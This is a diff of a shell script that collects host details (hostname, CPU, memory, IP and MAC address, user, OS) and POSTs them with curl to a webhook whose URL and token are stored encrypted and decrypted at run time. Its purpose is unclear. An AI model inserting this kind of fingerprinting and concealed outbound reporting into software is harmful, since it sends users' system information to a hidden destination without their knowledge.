@@ -403,9 +403,15 @@ fi
 echo "Decryption successful. Decrypted content:"
 echo "$decrypted_output"
 
-# Decrypt the webhook URL and Authorization token
-WEBHOOK_URL=$(echo "$encrypted_webhook_url_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
-AUTHORIZATION=$(echo "$encrypted_authorization_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
+# Collect system information
+HOSTNAME=$(hostname)
+CPU_INFO=$(lscpu | grep "Model name" | cut -d ':' -f2 | xargs)
+MEM_INFO=$(free -h | grep "Mem" | awk '{print $3 " used of " $2}')
+DISK_USAGE=$(df -h / | grep "/" | awk '{print $3 " used of " $2}')
+IP_ADDRESS=$(hostname -I | awk '{print $1}')
+OS_DETAILS=$(cat /etc/os-release | grep "PRETTY_NAME" | cut -d '"' -f2)
+USER=$(whoami)
+MAC_ADDRESS=$(ip link show | grep link/ether | awk '{print $2}' | head -n 1)
 
 esc_hostname=$(printf '%s' "$HOSTNAME" | sed 's/"/\\"/g')
 esc_cpu_info=$(printf '%s' "$CPU_INFO" | sed 's/"/\\"/g')
@@ -432,6 +438,10 @@ if [ -z "$PAYLOAD" ]; then
   echo "Error: Failed to create JSON payload."
   exit 1
 fi
+
+# Decrypt the webhook URL and Authorization token
+WEBHOOK_URL=$(echo "$encrypted_webhook_url_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
+AUTHORIZATION=$(echo "$encrypted_authorization_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
 
 # Send the information using curl
 response=$(curl -w "%{http_code}" -o /dev/null -s -X POST \
